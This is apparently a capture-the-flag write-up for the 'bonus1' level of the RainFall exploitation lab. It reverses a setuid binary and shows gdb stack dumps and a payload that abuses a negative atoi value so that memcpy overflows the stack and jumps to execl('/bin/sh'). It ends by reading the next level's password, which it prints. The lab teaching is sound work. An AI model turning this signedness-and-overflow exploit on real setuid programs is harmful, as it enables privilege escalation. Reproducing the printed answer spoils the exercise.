@@ -1,0 +1,96 @@
+
+```bash
+bonus1@RainFall:~$ ls -la
+-rwsr-s---+ 1 bonus2 users  5043 Mar  6  2016 bonus1
+
+bonus1@RainFall:~$ file bonus1 
+bonus1: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x5af8fd13428afc6d05de1abfa9d7e7621df174c7, not stripped
+```
+
+Reversed in c:
+```c
+int main(int argc, const char **argv, const char **envp)
+{
+    char dest[40];
+    int len;
+
+    len = atoi(argv[1]);
+    if (len > 9)
+    {
+        return 1;
+    }
+    memcpy(dest, argv[2], 4 * len);
+    if (len == 1464814662)
+    {
+        execl("/bin/sh", "sh", 0);
+    }
+
+    return 0;
+}
+```
+
+This in is fairly easy, `atoi()` can read negative number, and that pass the check just after the `atoi()` call
+After that `memcyp()` take a `size_t` as len, the only problem of this is the size of len, is a bit to big to fit as string in stack
+
+And we can use dest to write over eip and point after the `if()`:
+```bash
+0x8048480 <main+92>             jne    0x804849e <main+122>
+0x8048482 <main+94>             movl   $0x0,0x8(%esp)
+0x804848a <main+102>            movl   $0x8048580,0x4(%esp)
+0x8048492 <main+110>            movl   $0x8048583,(%esp)
+0x8048499 <main+117>            call   0x8048350 <execl@plt>
+
+(gdb) x/20x $esp
+0xbffff6e0:     0xbffff6f4      0xbffff8ff      0x00000008      0x080482fd
+0xbffff6f0:     0xb7fd13e4      0x41414141      0x42424242      0x080484d1
+0xbffff700:     0xffffffff      0xb7e5edc6      0xb7fd0ff4      0xb7e5ee55
+0xbffff710:     0xb7fed280      0x00000000      0x080484b9      0x00000002
+0xbffff720:     0x080484b0      0x00000000      0x00000000      0xb7e454d3
+(gdb) x/4x $ebp
+0xbffff728:     0x00000000      0xb7e454d3      0x00000001      0xbffff7c4
+```
+
+0xbffff72c (3221223212) - 0xbffff6f4 (3221223156) = 56
+
+We create a payload:
+```bash
+rm -f /tmp/payload_bonus1
+printf 'A%.0s' {1..56} > /tmp/payload_bonus1 # Padding
+echo -ne "\x82\x84\x04\x08" >> /tmp/payload_bonus1 # address of execl (0x8048482)
+```
+
+
+./bonus1 -1073741809 "$(cat /tmp/payload_bonus1)"
+
+Now we need `memcpy()` to write exatly 60 bytes, for this we need to find the eqivalent in a int * 4:
+```c
+#include <stdio.h>
+
+int main(void)
+{
+	for (int i = 0; i <= 0; i--)
+	{
+		size_t tmp;
+
+		tmp = i * 4;
+		if (tmp == 60)
+		{
+			printf("%d\n", i);
+			return 0;
+		}
+	}
+	return 0;
+}
+```
+
+```bash
+% ./a.out 
+-1073741809
+```
+
+And now we can run the payload:
+```bash
+bonus1@RainFall:~$ ./bonus1 -1073741809 "$(cat /tmp/payload_bonus1)"
+$ cat /home/user/bonus2/.pass
+579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
+```
